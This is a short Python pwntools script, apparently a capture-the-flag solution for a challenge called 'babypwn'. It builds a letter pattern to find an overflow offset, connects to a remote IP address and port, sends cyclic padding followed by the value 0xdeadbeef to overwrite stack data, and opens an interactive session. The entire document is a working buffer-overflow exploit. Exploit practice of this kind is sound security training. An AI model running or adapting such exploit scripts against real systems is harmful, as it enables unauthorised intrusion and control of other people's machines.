from pwn import *

LOCAL = False

c = ""
for i in range(100):
    c += chr(ord('A')+i//4)
with open('payload','w') as f:
    f.write(c + '\n')

padding = c.index(chr(0x54))
print(padding)

r = process('./babypwn') if LOCAL else remote('35.185.183.51', 4202)

r.sendline(cyclic(padding) + p32(0xdeadbeef))
r.interactive()
